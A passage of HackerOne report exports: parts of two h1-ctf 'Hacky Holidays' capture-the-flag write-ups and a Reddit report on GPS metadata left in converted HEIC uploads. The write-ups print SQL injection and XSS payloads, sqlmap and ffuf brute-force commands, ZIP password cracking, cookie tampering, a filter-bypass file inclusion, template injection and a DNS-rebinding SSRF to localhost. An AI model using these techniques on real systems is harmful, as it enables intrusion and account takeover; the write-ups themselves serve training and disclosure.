4if (strlen($_POST["age"]) > 3) {
5    $errors[] = 'Age entered is too long';
6}
7$age = intval($_POST["age"]);
How to overflow it though? I tried many values like 999, 1000 but it threw the 'Age entered is too long' because of the string length check.
After more brainStorming 1e5 so the input becomes something like this,
Code 50 Bytes
1age=1e5 and lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYY
so many Y's are there to ensure the value of admin is set to Y, in case of overflow. 1e5 is a scientific notation and blows up to 100000, thats the way to enlargen the user_string and push Y to 113 with last name.
Intercept the request and change the value of age and signup with new creds.
<image_16>
Voila!!
img18
<image_17>
Flag 11
This one by far was the most difficult one. I had to spring up a discord bot to keep track of the brute force.
So we go to the /r3c0n_server_4fdk59 on day 11, (for me its 30th December lol), We see /api as one of the endpoints, and some images arranged based on their years.
So first thing first as every CTF player does, API enumeration (fuzzing) and ExifTool analysis on the images. => nothing
The images had a funny way of being fetched, they were rather base64 encrypted:
Code 160 Bytes
1eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
once decrypted it looks something like this:
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
So maybe this works like an auth? I attached it to my request as a cookie= token=<value> nothing.
API (part)
Upon visiting it we can notice there are a set of response codes and their meanings respectively.
There are two parameters we can try something on hash and data. I tried for XSS, and SSRF nothing. At last, I tied SQLi with SQLmap and it worked.
Code 100 Bytes
1sqlmap -u "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k" --risk 3 --level 3
<image_18>
The dumps provide us with nothing new. Bummer!! What's next? I thought of using the payload in the browser.
I found a XSS thought this might get something lol, nothing
STEP 0: The SQli
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=-7611%27%20UNION+SELECT%20NULL,NULL,%27%3Cscript%3Ealert(1)%3C/script%3E%27--%20-
After some hints in the server and Adam himself, it was clear that SQLi with an SQLi has to be used to get an auth token from the server, and then some more help from my fellow hacker in Hacker101 discord, it came down to brute-forcing the API but with new set of generated auths. In simple terms:
(SQLi, within an SQLi)
URL=https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/something%27%23%22,null,null%23
This link will generate a response that will have a nonexsisting image, which would look like this
Code 235 Bytes
1<div class="col-md-4">
2<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3NvbWV0aGluZyIsImF1dGgiOiJiNGQ4ZTEzOWNkMWY4N2U5YjRmY2QyNmM2MmUyNzQyZiJ9">
3</div>
which when decoded is nothing but
Code 102 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/something","auth":"b4d8e139cd1f87e9b4fcd26c62e2742f"}
So every time URL is sent one has to extract the token from this img tag and send that again to search query in this fashion.
STEP 1: Take the fuzzed URL
URL= ...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/FUZZ%27%23%22,null,null%23
STEP2: Send the request to the website, from the response fetch the value of data from the img tag (src value), and then send the request again to capture the response.
STEP3: Check for the response, we get "Expected HTTP status 200, Received: 400" as the response for most of the keywords, so the if the condition would be like anything but Expected HTTP status 200, Received: 404
<image_19>
Using this method, found out that there exists two paths, one user and other sleep which threw Invalid content type detected
<image_20>
So now we have a valid path, what's next? maybe there are more paths to it => Nothing
How about params? so the same URL as in STEP 1, but slight change.
STEP 4: Take the fuzzed URL
URL= ...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/user?FUZZ%27%23%22,null,null%23
repeat step 2 and 3, with a change that we are now getting Expected HTTP status 200, Received: 400.
Using this method, found out that there exists two paths, one username and other password and sleep which threw Invalid content type detected
<image_21>
well now we have found two valid params, so I am assuming we need to fuzz for them as well. As a basic instinct, I tried for an SQLi -> nothing.
but the URL did seem to be funny for ' & % so I enumerated more, and came back to this stage after 3 days lol. So the catch is to use the alphabet appended by % that way one can guess whether or not the given word is a substring of the valid user or password.
like for any alphabet + % like a ...link...user?username=a%.. the response would be like Expected HTTP status 200, Received: 204, so as always we go for if condition where the response is anything but Expected HTTP status 200, Received: 204 and we find g% to be one of it. hmmm very interesting.
so the wordlist for this would go like?
STEP5
a,b,c.....g..............ga...........gr...gri..........grinch.....grinchadmin.......grinchadmina....grinchadminaa
so we know the user name is grinch, very funny... How about password? I am assmuing this would involve numbers, this ran for like a so long, lol. The wordlist looked like
STEP6
a,b,c,d,e,..s...s1,s2,s3,s4....s4t.....you know it finally ended on s4nt4sucks, typical Grinch!
Code 22 Bytes
1grinchadmin:s4nt4sucks
So finally we have the ID and password lets go to the login in /attack-box, took me 7 days to figure this one out.
Flag found:
<image_22>
Flag 12
And finally few hours before the final deadline for the report submission, I try the flag 12.
We have the Santa's IP addresses, like previous flag this also has some wierd URL fetch as well. The base64 encoded value, I wonder what it could be.
hash:
Code 92 Bytes
1eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ==
decoded looks like this:
Code 67 Bytes
1{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
Hmmm, now as per HackerOne's tweet the hint is hash and the salt! so after brief thinking and playing with the hash, I tried finding out the salt using the brute force methodology. Hashcat to the rescue! we know what the hashes are for (assuming IPs, since its the only logical thing) and the salted hash. Using the wordlist rockyou.txt, it was matter of seconds for the hash to break.
<image_23>
mrgrinch463 is the salt. what next? we need to DOS Grinch right? we are on Santa's side. We need to encrypt the 127.0.0.1 address with salt to destroy ourselves (grinch's server).
using this website we get the slated hash value.
<image_24>
Time to generate the payload.
Code 64 Bytes
1{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
The Grinch's server identified it as the localhost and abandoned the attack... so lets try IPv6 versioning, "localhost" => nothing!
After several hints later in the discord channel, someone recommended the YouTube video of Watch owning the clout from Nahamsec and daeken.... DNS rebinding it is, still little shaky on the concept and several more hints later, but I knew what to do. Something on the grounds of, like xcy.com redirects to 127.0.0.1 like so 127.0.0.1 is blocked ...but a random domain is not, so that passes the localhost check...but if the domain later redirects to localhost, it will attack it.
<image_25>
After generating the URL for attack and respective hash
Code 81 Bytes
1{"target":"01020304.7f000001.rbndr.us","hash":"69c31cdcfad3ef1deb652f4aca52d2cc"}
encoded base64 version
Code 108 Bytes
1eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9
It doesn't work the first time and second time it redirects to 1.2.3.4.... hmmm
<image_26>
Time to attack the Grinch again! but wait for 15 seconds...lol
So the 4th time the payload works and voila!
Flag Found:
<image_27>
Conclusion
The CTF was not very easy, specially the last ones, but it was a thrill ride! Learned many things, intreacted with many talented people.
Kudos to Adam and Ben for such a creative CTF! hats off!! I would love to win the best report challenge but I am content with the h1-ctf badge as well :)
Impact
Holidays Saved!



==================================================

Report File: 1069039.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Privacy Violation

Contents:

Summary:
Users who upload HEIC/HEIF files (sometimes called "Live Photos") to reddit.com or old.reddit.com expect their GPS metadata to be stripped before being displayed publicly. Uploaded HEIC files are converted to PNG, but GPS metadata is incorrectly preserved, in violation of user privacy. The problem is likely device- and browser-agnostic, and mostly affects Safari users on Mac since other devices and browsers either automatically convert to a different format or do not permit HEIC files to be uploaded through the usual user flow.
Impact:
All users who have submitted HEIC files have their GPS locations exposed publicly, which can be scraped with little detection and no authorization.
Steps To Reproduce:
Take a Live photo on an iPhone 11 Pro with GPS location tagging enabled
Sync the photo to iCloud Photos
Upload HEIF/HEIC file to Reddit.com via Safari on macOS Big Sur (Example Screen_Shot_2020-12-29_at_5.00.34_PM.png (F1138749))
Submit post to any community
Visit the post and click the link to get to the https://i.redd.it/FILENAME.png file
Download the file
Supporting Material/References:
Expected behavior is no GPS metadata, but you can see that the metadata is present in these examples:
https://i.redd.it/s7vjzg05w6861.png (Safari)
https://i.redd.it/6wnf9cf637861.png (Safari)
https://i.redd.it/d1zqv32297861.png (Safari)
https://i.redd.it/8ytwrr5re7861.png (IE)
<image_0>
I was also able to reproduce this flow through Internet Explorer on Windows 10 (but not Edge), which means the issue is likely device- and browser-agnostic.
However, when I tested the following flows, I found that GPS metadata was correctly removed for:
Reddit iOS app on iPhone
Safari on iPad (local testing shows iOS converts it to a JPEG before uploading)
For some tests, I wasn't able to upload HEIC photos at all:
Chrome and Firefox on Mac (HEIC not supported by image/* MIME filter on accept attribute)
Chrome, Firefox, and Edge on Windows (Windows does not recognize HEIC as an image file)
Safari on iPhone (no option to upload photos on mobile view)
Safari on Mac after having changed the file extension from .HEIC to .PNG (not actually changing the file otherwise)
It seems likely that only Safari for Mac and Internet Explorer allow HEIC files to be uploaded directly to Reddit. All other methods I've tried seem to result in normal metadata scrubbing.
I was able to find location data for at least one other user in the wild: https://i.redd.it/1hn2uafmwu661.png (post). Downloading this image, I can see their GPS location:
<image_1>
I originally discovered this when spot-checking an image that I uploaded yesterday. The post can be found here, and the image was here. I have since deleted the image.
Impact
All users who have submitted HEIC files have their GPS locations exposed publicly, which can be scraped with little detection and no authorization.



==================================================

Report File: 1069080.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Summary:
As per the referenced blog entry, the Grinch has gone hi-tech this year with the intentions of ruining the holidays. The challenge was about infiltrating the Grinch's network and take it down.
As outlined on https://hackerone.com/h1-ctf, the domain hackyholidays.h1ctf.com was in scope.
It was possible to find multiple vulnerabilities, exploit various applications of the Grinch and finally turn the Grinch's own attack servers against himself by issuing a DDOS attack to 127.0.0.1 and knock him off the internet.
I hope that rebuilding his infrastructure keeps the Grinch busy for a while and gives hackers a chance to prepare for next year.
Steps To Reproduce:
Flag 1 - Flag leak in /robots.txt
Getting flag 1 was pretty easy - visiting https://hackyholidays.h1ctf.com/robots.txt gave away the first flag, flag{48104912-28b0-494a-9995-a203d1e261e7}:
<image_0>
Flag 2 - Secret Area
When visiting https://hackyholidays.h1ctf.com/s3cr3t-ar3a, the following text was shown:
<image_1>
The grinch does not want us to see the page, but maybe we can bypass his protections...
I tried to manipulate the HTTP request as follows without success:
Using 127.0.0.1 as value of the Host header
Adding the headers X-Originating-IP, X-Forwarded-For, X-Remote-IP and X-Remote-Addr
Adding cookies: I used access=1 and acess=true
First I didn't pay attention to the included scripts because they looked pretty standard according to their name, only JQuery and Boostrap seemed to be included. However, after running out of options, I took a closer look and noticed some strange content inside https://hackyholidays.h1ctf.com/assets/js/jquery.min.js:
<image_2>
This looks a lot like a flag, and indeed, after copy-pasting the variable declaration into the debugger and printing the value gets added as data-info attribute to the element with ID alertbox I got the flag, flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}.
<image_3>
The JavaScript tells us also that the next challenge might be available under /apps as soon at is released.
Flag 3 - People Rater
App description: "The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!"
After opening the People Rater app by clicking on the Start Challenge button, the first 5 people that the grinch does not like are already listed, luckily I did not find my name on that list, but who knows... 5 Additional entries can be loaded by clicking on the Load More button, but there seems to be a maximum of 16 entries on the list. In the background, requests are made to /people-rater/page/<pagenumber>, each page returns up to 5 JSON entries with ID and name, e.g. when requesting /people-rater/page/1, the following entries are returned:
Code 233 Bytes
1{"results":[{"id":"eyJpZCI6Mn0=","name":"Tea Avery"},{"id":"eyJpZCI6M30=","name":"Mihai Matthews"},{"id":"eyJpZCI6NH0=","name":"Ruth Ward"},{"id":"eyJpZCI6NX0=","name":"Calvin Hogan"},{"id":"eyJpZCI6Nn0=","name":"Reilly Cervantes"}]}
When clicking on an individual entry, an alert is shown with a rating of the person the grinch noted down. In the background, a GET request to /people-rater/entry?id=<id> is made, which e.g. returns the following result for the first entry:
Code 57 Bytes
1{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
The id parameter looks like base64 encoded JSON. What immediately looked interesting was that decoding the ID of the first entry gave the following result:
Code 40 Bytes
1$ echo eyJpZCI6Mn0= | base64 -d
2{"id":2}
Let's try to get the entry with the ID 1:
Code 46 Bytes
1$ echo -n '{"id":1}' | base64 -w0
2eyJpZCI6MX0=
Issuing the following GET request returns an entry for the grinch. Of course, the grinch gave himself a good rating, it's hard to stay objective when talking about oneself, isn't it? But more importantly, flag 3, flag{b705fb11-fb55-442f-847f-0931be82ed9a}, gets displayed as well:
<image_4>
Flag 4 - Swag Shop
App description: "Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop."
When visiting the swag shop site, 3 articles are displayed: one can buy an I Hate Xmas Hoodie, an Xmas Sucks Cap or a Snow Ball Launcher, obviously items the grinch himself would buy immediately. However, when clicking on the Purchase button below an item, a login promt gets displayed, it is not possible to buy anything if one does not have a swag shop account.
As there were no other options on the site, I took a look at the traffic in BurpSuite:
<image_5>
Trying to purchase an item triggered requests to some endpoints under /swagshop/api: login, purchase and stock. Trying to manipulate the parameters did not give any useful results, therefore, I decided to fuzz the endpoints under /swag-shop/api. After using some small wordlists without success, finally, two additional endpoints were discovered:
Code 378 Bytes
1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -mc all -fc 404 -t 4
2[SNIP]
3sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
4user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
5:: Progress: [3132/3132] :: Job [1/1] :: 23 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
The sessions endpoint looks interesting because it returned the status code 200 and quite a large response. Indeed, when issuing a GET request to /swag-shop/api/sessions, a list of sessions got returned!
Code 2.19 KiB
1{
2  "sessions": [
3    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
4    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
5    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
6    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
7    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
8    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
9    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
10    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
11  ]
12}
There is one entry standing out due to its length. When decoding this entry, we get a UUID and a cookie:
Code 539 Bytes
1eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
2
3{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
I lost some time because I tried to use the cookie directly as suggested by the JavaScript on the swag shop site:
Code 285 Bytes
1$(".loginbtn").click(function(){
2	$.post("/swag-shop/api/login",{
3		username:$('input[name="username"]').val(),password:$('input[name="password"]').val()
4	},function(o){
5		document.cookie("token="+o.token),window.location="/swag-shop"
6	}).fail(function(){
7		alert("Login Failed")
8	})
9}
However, adding a cookie with the key token did not help, even when decoding the cookie and using the base64 decoded value:
Code 320 Bytes
1$ echo NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY= | base64 -d
24548292f7d6624b1a42f74d11a48313860a5ada174b8daa735526c489046cbab67a1acd7b0fa987d9ed91d99ad5a6222ffc36c047899fb8f6c9e48ba2206ed16
This value is 128 characters long and therefore could be a hash, however googling and trying to crack the hash did not work either.
Finally, I remembered the challenge description: "Try and find a way to pull the Grinch's personal details from the online shop." Maybe there is a way to get personal details without logging in? I remembered that I found another endpoint, /swag-shop/api/user and that I got a user ID from the session identifier as well.
The user endpoint returns 400 Bad Request and the message {"error":"Missing required fields"} when being called without parameters. Another round of fuzzing with different wordlists finally revealed that the uuid parameter is required:
Code 346 Bytes
1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=x -mc all -fr 'Missing required fields' -t 4
2[snip]
3uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
4:: Progress: [2588/2588] :: Job [1/1] :: 20 req/sec :: Duration: [0:02:08] :: Errors: 0 ::
The 404 Not Found first made me think that this approach was another rabbit hole, but the message {"error":"Could not find matching uuid"} looked promising. Using the user ID as UUID finally gave me grinch's personal details together with the flag, flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}:
<image_6>
Flag 5 - Secure Login
App description: "Try and find a way past the login page to get to the secret area."
When visiting https://hackyholidays.h1ctf.com/secure-login, a login form is shown and nothing else. When trying to login with random username and password, the error message Invalid Username gets returned. I tried to manipulate the username and password parameters, use SQLI payloads and test if special characters cause different error messages without success. As there was no other interesting content in the HTML source of the login page, I decided to bruteforce the username:
Code 441 Bytes
1$ ffuf -X POST -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -d 'username=FUZZ&password=asdf' -H 'Content-Type: application/x-www-form-urlencoded' -mc all -fr "Invalid Username"
2[snip]
3access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
4:: Progress: [1000/1000] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
Great - using access as username returns Invalid Password instead of Invalid Username. Maybe we can bruteforce the password as well?
Code 437 Bytes
1$ ffuf -X POST -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -d 'username=access&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -mc all -fr "Invalid Password"
2[snip]
3computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
4:: Progress: [1000/1000] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
Great, seems like we got valid credentials!
Login with credentials access:computer succeeds, but No Files To Download gets displayed. Looks like there are some files to download, but not for us...
<image_7>
After searching for interesting stuff in the HTML source with no success, I decided to take a closer look at the authentication mechanism. The page uses cookie-based authentication. The cookie seems to be base64-encoded JSON because it starts with eyJ and ends with %3D (which is = when being URL-decoded). Decoding the cookie gives the following result:
Code 159 Bytes
1$ echo eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0= | base64 -d
2{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
When changing "admin": false to "admin": true, base64-encode, then URL-encoding the cookie and using the new cookie value instead, a download link gets displayed:
<image_8>
After downloading the file and trying to open it, I noticed that the ZIP archive is encrypted. However, the password is simple enough to be crackable:
Code 516 Bytes
1$ zip2john my_secure_files_not_for_you.zip > hash.txt
2[snip]
3$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
4Using default input encoding: UTF-8
5Loaded 1 password hash (PKZIP [32/64])
6Will run 2 OpenMP threads
7Press 'q' or Ctrl-C to abort, almost any other key for status
8hahahaha         (my_secure_files_not_for_you.zip)
91g 0:00:00:00 DONE (2020-12-23 10:20) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s total90..hawkeye
10Use the "--show" option to display all of the cracked passwords reliably
11Session completed
Unzipping the archive by using the password hahahaha was possible. The archive contains two files: flag.txt and xxx.png. While xxx.png seems to be a selfie of the grinch (not his best selfie by the way), flag.txt contains a flag:
Code 58 Bytes
1$ cat flag.txt 
2flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Flag 6 - My Diary
App description: "Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?"
Visiting https://hackyholidays.h1ctf.com/my-diary redirects to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html and shows the grinch's calendar. Obviously, entries.html is used as a template - let's try to directly access that file. Indeed, we can access https://hackyholidays.h1ctf.com/my-diary/entries.html directly, which means that we potentially have local file inclusion using the template parameter. Trying to access /my-diary/index.php causes a redirect as well, but accessing /my-diary/index.html causes a 404 Not Found response, therefore, the application seems to be written in PHP.
After overcomplicating things by trying to use PHP stream wrappers I finally found out that index.php can be included directly:
<image_9>
Alright, getting redirected simply means that the target file was not found after removing every character that is not alphanumeric or a dot and also removing the substrings admin.php and secretadmin.php.
Trying to access /my-diary/admin.php directly results in 404 Not Found, so maybe that file does not even exist. However, trying to access /my-diary/secretadmin.php looks more interesting as the error message You cannot view this page from your IP Address is returned.
This means that we probably need to bypass the filter mechanism. There seems to be no way around the character restriction. However, filtering the substrings admin.php and secretadmin.php is not done recursively but just once. Therefore, we can get the source of secretadmin.php wich contains the flag by crafting a filename that results in secretadmin.php after being filtered (secretadmsecretadadmin.phpmin.phpin.php):
<image_10>
Unfortunately, the Post button does nothing (yet?), but hey, getting another flag is always great!
Flag 7 - Hate Mail Generator
App description: "Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!"
The grinch does not get nicer when christmas gets closer, in contrary, he is obviously already grumpy enough to use a hate mail generator in order to speed up his hate mail workflow.
There is one existing campaign with the following markup:
Code 134 Bytes
1{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
Clicking on the Preview button shows the HTML mail. The variables used in the markup indicate that we might be able to use template injection for exploitation by creating new templates and previewing them, which is possible when clicking on the Create New button in the campaign overview.
When previewing newly generated templates, a POST request to /hate-mail-generator/new/preview is sent with the parameters preview_markup and preview_data. The content of the Markup field is submitted within the preview_markup parameter. Great, this looks like template injection will be possible indeed. However, the template variables that can be used seem to be restricted to the variables declared in the preview_data parameter and the template:<filename> variable we saw in the existing campaign.
Trying to insert an arbitrary template name by using {{template:asdf}} as preview_markup tells us that the template file is expected to be found under /templates/<templatename> due to the error message Cannot find template file /templates/asdf.
Trying to access https://hackyholidays.h1ctf.com/hate-mail-generator/templates seems to work, we can see that 3 files are present in this directory because directory listing is enabled:
<image_11>
Unfortunately, we cannot access those files directly, the response is always 403 forbidden. It is possible to show the file content by inserting {{template:<filename>}} into a new hate mail and display the preview, but this only works for two out of those three files: when trying to display 38dhs_admins_only_header.html, the error message You do not have access to the file 38dhs_admins_only_header.html gets shown in the response instead of the file content.
However, it is possible to bypass the restriction to display 38dhs_admins_only_header.html via template markup because it is possible to add markup as value of a template variable in preview_data. When using the corresponding variable key inside preview_markup, first the key gets resolved to the corresponding value and afterwards the value gets resolved again, which means that in case a template is referenced, the content of the template file gets inserted into the preview. Therefore, when using the following values, it is possible to display 38dhs_admins_only_header.html which contains the flag:
preview_markup: {{name}}
preview_data: {"name":"{{template:38dhs_admins_only_header.html}}"}
The response to such a request contains the flag, flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}:
<image_12>
Flag 8 - Forum
App description: "The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!"
Well, I'm not surprised that nobody wants to talk to the grinch...
When visiting https://hackyholidays.h1ctf.com/forum, two forum section get displayed: the General section contains two categories, Christmas!!! and Nice Things To Do. Of course, Nice Things To Do does not contain any posts yet, the grinch does not do nice things anyway, but Christmas!!! contains one post with the title Why I hate Christmas which - surprise - is written by a user named grinch. max seems to be the only user that responded (and probably the only user that is registered as well...).
The Admin category cannot be viewed without being logged in as an admin, only the text You need to be an admin to view these posts gets displayed to unauthenticated users.
This challenge sent me into countless rabbit holes. Categories and posts are referenced by IDs in URL segments, so I first tried if IDOR works but gave up after the first 100 IDs gave no results. As there are two possible usernames, I tried to bruteforce their passwords with a small wordlist without result. Afterwards, I used ffuf to find additional paths. There seems to be a phpmyadmin installation accessible via https://hackyholidays.h1ctf.com/forum/phpmyadmin, but it seems to be just a mock because no other files that are typically present could be found there. Nevertheless, I researched popular CVEs that are easy to exploit but none of them worked of course (I did not expect to be successful with that approach anyway because it was not even possible to find out which version of phpmyadmin was mocked here).
Finally, after scrolling through the Discord channel, I found some hints that the source can be found in the Internet. Oh well, I totally did not expect that we need to use OSINT to proceed, but let's give it a try...
To my surprise, it was pretty easy to find the github repo with the forum sourcecode - the contribution activity of adamtlangley showed that he committed to Grinch-Networks/forum.
<image_13>
Looking through the commit history (fortunately, there were only 4 commits), a commit named small fix struck my attention:
<image_14>
The commit removed the credentials of a database user in models/Db.php:
Code 156 Bytes
1self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
2self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
